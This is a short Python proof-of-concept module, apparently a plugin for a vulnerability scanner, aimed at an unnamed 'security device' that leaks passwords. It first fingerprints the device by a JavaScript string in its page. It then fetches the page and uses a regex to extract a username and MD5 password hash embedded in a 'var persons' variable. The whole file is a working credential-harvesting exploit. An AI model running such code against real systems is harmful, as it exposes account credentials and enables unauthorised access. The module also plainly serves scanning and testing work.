# -*- coding:utf-8 -*-
# 安全设备md5密码泄露

import re

from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)
        self.result = False


    def safe_md5_poc(self, url):
        resp = self.requestUtil.get(url)
        try:
            user_info = re.findall(r'var persons.*?"name":"(.*?)".*?"password":"(.*?)"', resp.text)[0]
            result = ["安全设备md5密码泄露", "用户名: %s<br>MD5密码: %s" % (user_info[0], user_info[1])]
        except Exception as e:
            result = []
        return result


    def fingerprint(self):
        resp = self.requestUtil.get(self.service.url)
        if 'Get_Verify_Info(hex_md5(user_string).' in resp.text:
            return True


    def poc(self):
        return self.safe_md5_poc(self.service.url)
